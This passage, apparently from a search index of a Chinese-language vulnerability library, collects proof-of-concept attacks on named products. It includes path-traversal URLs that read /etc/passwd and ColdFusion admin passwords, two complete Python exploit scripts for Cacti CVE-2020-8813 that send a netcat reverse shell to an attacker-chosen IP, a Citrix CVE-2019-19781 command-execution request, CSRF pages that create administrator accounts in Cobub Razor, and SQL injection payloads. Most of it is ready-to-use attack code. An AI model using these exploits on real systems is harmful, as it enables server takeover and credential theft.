0&gt;&amp;1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","title":"Adobe ColdFusion \u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-21 13:01:58</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>Adobe ColdFusion 8\u30019</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u8bfb\u53d6etc/passwd</p> <pre><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en\n</code></pre> <p>\u8bfb\u53d6\u540e\u53f0\u7ba1\u7406\u5458\u5bc6\u7801</p> <pre><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/","title":"CVE 2020 8813   Cacti v1.2.8 RCE","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#cacti-v128-authenticated-remote-code-execution-cve-2020-8813","title":"Cacti v1.2.8 authenticated Remote Code Execution (CVE-2020-8813)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#_1","title":"\u7b80\u4ecb","text":"<p>Cacti\u662f\u4e00\u5957\u57fa\u4e8ePHP,MySQL,SNMP\u53caRRDTool\u5f00\u53d1\u7684\u7f51\u7edc\u6d41\u91cf\u76d1\u6d4b\u56fe\u5f62\u5206\u6790\u5de5\u5177\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#exp1","title":"EXP1 \u9700\u8981\u8ba4\u8bc1","text":"<pre><code>#!/usr/bin/python3\n\n# Exploit Title: Cacti v1.2.8 Remote Code Execution\n# Date: 03/02/2020\n# Exploit Author: Askar (@mohammadaskar2)\n# CVE: CVE-2020-8813\n# Vendor Homepage: https://cacti.net/\n# Version: v1.2.8\n# Tested on: CentOS 7.3 / PHP 7.1.33\n\nimport requests\nimport sys\nimport warnings\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import quote\n\nwarnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4')\n\n\nif len(sys.argv) != 6:\n    print(\"[~] Usage : ./Cacti-exploit.py url username password ip port\")\n    exit()\n\nurl = sys.argv[1]\nusername = sys.argv[2]\npassword = sys.argv[3]\nip = sys.argv[4]\nport = sys.argv[5]\n\ndef login(token):\n    login_info = {\n    \"login_username\": username,\n    \"login_password\": password,\n    \"action\": \"login\",\n    \"__csrf_magic\": token\n    }\n    login_request = request.post(url+\"/index.php\", login_info)\n    login_text = login_request.text\n    if \"Invalid User Name/Password Please Retype\" in login_text:\n        return False\n    else:\n        return True\n\ndef enable_guest(token):\n    request_info = {\n    \"id\": \"3\",\n    \"section25\": \"on\",\n    \"section7\": \"on\",\n    \"tab\": \"realms\",\n    \"save_component_realm_perms\": 1,\n    \"action\": \"save\",\n    \"__csrf_magic\": token\n    }\n    enable_request = request.post(url+\"/user_admin.php?header=false\", request_info)\n    if enable_request:\n        return True\n    else:\n        return False\n\ndef send_exploit():\n    payload = \";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s\" % (ip, port)\n    cookies = {'Cacti': quote(payload)}\n    requests.get(url+\"/graph_realtime.php?action=init\", cookies=cookies)\n\nrequest = requests.session()\nprint(\"[+]Retrieving login CSRF token\")\npage = request.get(url+\"/index.php\")\nhtml_content = page.text\nsoup = BeautifulSoup(html_content, \"html5lib\")\ntoken = soup.findAll('input')[0].get(\"value\")\nif token:\n    print(\"[+]Token Found : %s\" % token)\n    print(\"[+]Sending creds ..\")\n    login_status = login(token)\n    if login_status:\n        print(\"[+]Successfully LoggedIn\")\n        print(\"[+]Retrieving CSRF token ..\")\n        page = request.get(url+\"/user_admin.php?action=user_edit&amp;id=3&amp;tab=realms\")\n        html_content = page.text\n        soup = BeautifulSoup(html_content, \"html5lib\")\n        token = soup.findAll('input')[1].get(\"value\")\n        if token:\n            print(\"[+]Making some noise ..\")\n            guest_realtime = enable_guest(token)\n            if guest_realtime:\n                print(\"[+]Sending malicous request, check your nc ;)\")\n                send_exploit()\n            else:\n                print(\"[-]Error while activating the malicous account\")\n\n        else:\n            print(\"[-] Unable to retrieve CSRF token from admin page!\")\n            exit()\n\n    else:\n        print(\"[-]Cannot Login!\")\nelse:\n    print(\"[-] Unable to retrieve CSRF token!\")\n    exit()\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#exp2","title":"EXP2 \u5f00\u542f\u6765\u5bbe\u5b9e\u65f6\u56fe\u67e5\u770b\u6743\u9650\u5219\u4e0d\u9700\u8981\u8ba4\u8bc1","text":"<pre><code>#!/usr/bin/python3\n\n# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution\n# Date: 03/02/2020\n# Exploit Author: Askar (@mohammadaskar2)\n# CVE: CVE-2020-8813\n# Vendor Homepage: https://cacti.net/\n# Version: v1.2.8\n# Tested on: CentOS 7.3 / PHP 7.1.33\n\nimport requests\nimport sys\nimport warnings\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import quote\n\nwarnings.filterwarnings(\"ignore\", category=UserWarning, module='bs4')\n\n\nif len(sys.argv) != 4:\n    print(\"[~] Usage : ./Cacti-exploit.py url ip port\")\n    exit()\n\nurl = sys.argv[1]\nip = sys.argv[2]\nport = sys.argv[3]\n\ndef send_exploit(url):\n    payload = \";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s\" % (ip, port)\n    cookies = {'Cacti': quote(payload)}\n    path = url+\"/graph_realtime.php?action=init\"\n    req = requests.get(path)\n    if req.status_code == 200 and \"poller_realtime.php\" in req.text:\n        print(\"[+] File Found and Guest is enabled!\")\n        print(\"[+] Sending malicous request, check your nc ;)\")\n        requests.get(path, cookies=cookies)\n    else:\n        print(\"[+] Error while requesting the file!\")\n\nsend_exploit(url)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#httpsshellssystemscacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813","title":"\u8be6\u7ec6\u5206\u6790\u4ee5\u53ca\u6765\u6e90:https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/","title":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Citrix 13.x,12.1,12.0,11.1,10.5</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#_2","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u65b9\u6cd5\u4e00\uff1a \u6784\u9020\u5982\u4e0b\u6570\u636e\u5305</p> <pre><code>POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\nHost: target-ip\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.23.0\nNSC_NONCE: nsroot\nNSC_USER: ../../../netscaler/portal/templates/15ffbdca\nContent-Length: 89\n</code></pre> <p>url=http://example.com&amp;title=test&amp;desc=[% template.new('BLOCK' = 'print <code>whoami</code>') %] \u8bbf\u95ee/vpn/../vpns/portal/test.xml\u5373\u53ef\u8fd4\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u65b9\u6cd5\u4e8c\uff1a exp\u4e0b\u8f7d\uff1ahttps://codeload.github.com/jas502n/CVE-2019-19781/zip/master</p> <p>python CVE-2019-19781-Citrix-ADC-Remote-Code-Execution.py https://target-ip \u63d0\u793a\u4ee3\u7406\u9519\u8bef\u7684\u8bdd\uff0c\u6302\u672c\u5730\u4ee3\u7406\u5373\u53ef\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","title":"Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e 2018-03-06 Kyhvedn\uff08yinfengwuyueyi@163.com\u3001kyhvedn@5ecurity.cn\uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.7.2 CVE-2018-7720"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\uff0c\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u7279\u5b9a\u9875\u9762\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u3002\u4fdd\u5b58\u5982\u4e0b\u5229\u7528\u4ee3\u7801\u4e3ahtml\u9875\u9762\uff0c\u6253\u5f00\u9875\u9762\u5c06\u589e\u52a0test123/test\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u5229\u7528\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>&lt;body&gt;\n  &lt;script&gt;alert(document.cookie)&lt;/script&gt;\n    &lt;form action=\"http://localhost/index.php?/user/createNewUser/\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"username\" value=\"test123\" /&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"test&amp;#64;test123&amp;#46;test\" /&gt;\n      &lt;input type=\"hidden\" name=\"password\" value=\"test\" /&gt;\n      &lt;input type=\"hidden\" name=\"confirm&amp;#95;password\" value=\"test\" /&gt;\n      &lt;input type=\"hidden\" name=\"userrole\" value=\"3\" /&gt;\n      &lt;input type=\"hidden\" name=\"user&amp;#47;ccreateNewUser\" value=\"\ufffd&amp;#136;&amp;#155;\ufffd&amp;#187;\ufffd\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","title":"Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-04-09 ppb\uff08ppb@5ecurity.cn\uff09 https://github.com/cobub/razor/ https://github.com/cobub/razor/ 0.72 CVE-2018-7745"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u6f0f\u6d1e\uff0c\u5728\u4e0d\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53d1\u9001\u7279\u5b9a\u6570\u636e\u5305\uff0c\u53ef\u65b0\u589e\u7ba1\u7406\u5458\u8d26\u53f7\u3002\u4fdd\u5b58\u5982\u4e0b\u5229\u7528\u4ee3\u7801\u4e3ahtml\u9875\u9762\uff0c\u6253\u5f00\u9875\u9762\u5c06\u589e\u52a0test/test123\u7684\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u5229\u7528\u4ee3\u7801\u5982\u4e0b\uff1a <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://127.0.0.1/index.php?/install/installation/createuserinfo\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"siteurl\" value=\"http://127.0.0.1/\" /&gt;\n      &lt;input type=\"hidden\" name=\"superuser\" value=\"test\" /&gt;\n      &lt;input type=\"hidden\" name=\"pwd\" value=\"test123\" /&gt;\n      &lt;input type=\"hidden\" name=\"verifypassword\" value=\"test123\" /&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"12@qq.com\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e 2018-04-16 Kyhvedn\uff08yinfengwuyueyi@163.com\u3001kyhvedn@5ecurity.cn\uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.8.0 CVE-2018-8057"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u201c/application/controllers/manage/channel.php\u201d\u9875\u9762\u7684\u201cchannel_name\u201d\u53ca\u201cplatform\u201d\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u5bfc\u81f4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>http://localhost/index.php?/manage/channel/addchannel </p> <p>POST data:  </p> <p>1.channel_name=test\" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&amp;platform=1  </p> <p>2.channel_name=test\" AND SLEEP(5)-- NklJ&amp;platform=1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e 2018-04-20 Kyhvedn\uff08yinfengwuyueyi@163.com\u3001kyhvedn@5ecurity.cn\uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.8.0 CVE-2018-8056/CVE-2018-8770"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\uff0c\u7cfb\u7edf\u4f1a\u663e\u793a\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u65b9\u6cd5\u4e00\uff1a  </p> <pre><code>URL: http://localhost/export.php\nHTTP Method: GET\nURL: http://localhost/index.php?/manage/channel/addchannel\nHTTP Method: POST\nData: channel_name=test\"&amp;platform=1\n</code></pre> <p>\u65b9\u6cd5\u4e8c\uff1a Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\uff0c\u7cfb\u7edf\u4f1a\u663e\u793a\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\u3002</p> <pre><code>HTTP Method: GET\nhttp://localhost/tests/generate.php\nhttp://localhost/tests/controllers/getConfigTest.php\nhttp://localhost/tests/controllers/getUpdateTest.php\nhttp://localhost/tests/controllers/postclientdataTest.php\nhttp://localhost/tests/controllers/posterrorTest.php\nhttp://localhost/tests/controllers/posteventTest.php\nhttp://localhost/tests/controllers/posttagTest.php\nhttp://localhost/tests/controllers/postusinglogTest.php\nhttp://localhost/tests/fixtures/Controller_fixt.php\nhttp://localhost/tests/fixtures/Controller_fixt2.php\nhttp://localhost/tests/fixtures/view_fixt2.php\nhttp://localhost/tests/libs/ipTest.php\nhttp://localhost/tests/models/commonDbfix.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","title":"Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e 2018-03-04 zzw (zzw@5ecurity.cn) https://github.com/CouchCMS/CouchCMS/ https://github.com/CouchCMS/CouchCMS/ 2.0 CVE-2018-7662"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\u7cfb\u7edf\u8fd4\u56de\u7684\u62a5\u9519\u4fe1\u606f\u4e2d\u66b4\u9732\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Couch through\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u8bbf\u95ee\u5982\u4e0b\u9875\u9762\uff0c\u62a5\u9519\u4fe1\u606f\u4e2d\u663e\u793a\u5b8c\u6574\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002</p> <pre><code>Location:\nincludes/mysql2i/mysql2i.func.php\naddons/phpmailer/phpmailer.php\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Django/CVE-2020-7471%20Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20/","title":"CVE-2020-7471 